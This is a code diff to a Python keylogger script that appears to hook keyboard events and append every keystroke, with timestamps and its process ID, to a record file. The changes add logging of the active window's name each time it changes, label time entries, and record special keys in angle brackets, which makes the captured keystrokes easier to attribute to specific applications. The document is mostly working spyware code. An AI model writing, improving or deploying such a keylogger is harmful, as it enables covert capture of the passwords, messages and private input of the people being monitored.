@@ -9,6 +9,8 @@ kill_event = 0
 
 time_event = ""
 
+window = ""
+
 with open(recordfile, "a") as f:
     f.write(datetime.datetime.now().strftime("%d/%m/%Y %H:%M"))
     f.write("\nStarted in PID {0}!".format(str(os.getpid())))
@@ -16,11 +18,14 @@ with open(recordfile, "a") as f:
 
 
 def OnKeyPress(event):
-    global kill_event, time_event
+    global kill_event, time_event, window
     recordKey = open(recordfile, "a")
     if time_event != datetime.datetime.now().strftime("%d/%m/%Y %H:%M"):
         time_event = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
-        recordKey.write("\n{0}\n".format(time_event))
+        recordKey.write("\nTime: {0}\n".format(time_event))
+    if window != str(event.WindowName):
+        window = str(event.WindowName)
+        recordKey.write("\nWindow Name: {0}\n".format(str(window)))
     if event.Ascii == 32:  # 32 is the ascii value of space
         kill_event = 0
         recordKey.write(" ")
@@ -34,7 +39,11 @@ def OnKeyPress(event):
             hook.cancel()
     else:
         kill_event = 0
-        recordKey.write(event.Key)
+        if 33 <= event.Ascii <= 126:
+            recordKey.write(event.Key)
+        else:
+            recordKey.write("<{0}>".format(str(event.Key)))
+
     recordKey.close()
 
 
